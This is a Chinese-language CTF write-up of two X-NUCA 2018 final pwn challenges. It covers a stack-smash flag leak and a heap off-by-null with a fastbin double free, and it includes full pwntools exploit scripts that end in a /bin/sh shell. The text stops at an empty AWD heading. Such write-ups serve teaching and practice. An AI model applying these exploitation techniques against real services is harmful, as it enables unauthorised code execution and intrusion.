title: X-NUCA 2018个人赛/决赛PWN
date: 1970-1-1
categories:
- PWN
---

终于熬过考试周了...重装电脑加上配虚拟机博客环境前后花了快两天.寒假整理一下以前的题目吧,先是12月初的XNUCA总决赛和铁三总决赛.

# 个人赛

## PWN0(18solve)

- 个人赛签到题,一个gets栈溢出,有canary,只有一次输入机会,显然不是ROP的打法,flag在内存中,先让我们输入小于flag长度的任意字符,输入回车结束
- 这里利用stack smash,当canary存在时,如果发生栈溢出,程序会执行如下代码:

```c
__libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
```

- 因为flag在内存中,所以我们可以算出输入点和__libc_argv[0],也就是程序名称的偏移,填充后写入一根指针,利用报错信息打印flag,由于内存映射机制,所以程序中有时候会存在两个flag

```python
from pwn import *
r = process("./catch_me")
# for i in range(24):
r = remote("172.19.8.82",9999)
r.recvuntil("flag:")
r.sendline("")
payload = "a" * (0x7fffffffdf38 - 0x7fffffffde10) + p64(0x600CA0)
r.recvuntil("sure?")
r.sendline(payload)
r.recvuntil(": ")
flag = r.recv(32)
print flag
```

- 当时因为是给了一台内网的机器,没有pwntools,最后用的socket写的脚本,后来才知道有一个单文件库zio可以直接复制进去用.
- 然后并没有给pwn题的服务器和端口,最后只能用nmap扫描端口逐一nc来确定题目XD

## PWN1(10solve)

- 这就是一个堆题了,记得当时有几个师傅做的也非常快
- 扫一遍功能switch,发现有两个后门!输入1234和输入2333的时候会分别出发,1234就是一个malloc(0x20)然后向里面和bss段分别读入0x20,2333则是system(command),很明显这是要修改command为/bin/sh
- 分别查看几个基础功能函数,发现在new时,存在一个`scanf("%32s",ptr)`,也就是这里存在了一个off-by-null,scanf函数自动补的0使得当输入恰好为32位的时候,会有33位被赋值.
- 后面的功能函数则是才用了read函数,不存在溢出,在free处,也有对应的inuse数组作为防止double-free的保护,整理结构体发现

```c
typedef struct node{
    char content[32];
    char * nameptr;
};
```

- 也就是content刚好可以盖到nameptr指针,使得低位变成0,加上后门1234的偏移刚好可以获得指向相同堆块的指针,一发double解决,还要注意的是fastbin的验证条件.

```python
from pwn import *

r = process("./note")

def sa(a,b):
    r.sendlineafter(a,b)

def add(name,content):
    sa("command:\n","1")
    sa("name:",name)
    sa("content:",content)

def edit(index,name,content):
    sa("command:\n","2")
    sa("edit\n",str(index))
    sa("name:\n",name)
    sa("content:\n",content)

def show(index):
    sa("command:\n","3")
    sa("view",str(index))

def free(index):
    sa("command:\n","4")
    sa("id:",str(index))

def backdoor1(name,content):
    sa("command:\n","1234")
    sa("name:",name)
    sa("content:\n",content)

def getshell():
    sa("command:\n","2333")

def exp():
    backdoor1("backdoor","flagflag")
    add("name","0")
    add("name","1")
    add("name","2")
    add("name","3")
    add("name","4")
    add("name","5")
    add("name","6")
    add("name","7"*0x20)
    free(7)
    free(5)
    free(6)
    
    add(p64(0x602090-0x8),"fff")
    add("lll","lll")
    add("aaa","a")
    add("/bin/sh\x00","ggg")
    getshell()
    r.interactive()
    #add("name","/bin/sh\x00")
    # gdb.attach(r)
    

if __name__ == "__main__":
    sa("Please leave your name :",p64(0x21))
    exp()
```

# AWD

## pwn1